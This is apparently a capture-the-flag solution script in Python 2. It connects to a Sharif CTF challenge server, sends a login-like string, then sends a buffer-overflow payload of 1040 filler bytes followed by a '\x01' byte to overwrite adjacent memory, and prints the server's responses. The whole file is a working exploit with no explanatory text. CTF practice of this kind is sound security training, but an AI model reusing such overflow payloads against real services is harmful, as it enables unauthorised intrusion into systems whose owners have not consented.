import socket
import sys

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect the socket to the port where the server is listening
server_address = ('ctf.sharif.edu', 27515)
print >>sys.stderr, 'connecting to %s port %s' % server_address
sock.connect(server_address)

try:
    print sock.recv(256)
    sock.sendall('foobar\n')

    print sock.recv(256)
    message = 'a'*1040+'\x01'+'\n'
    sock.sendall(message)
    data = sock.recv(256)
    print data
    
finally:
    sock.close()
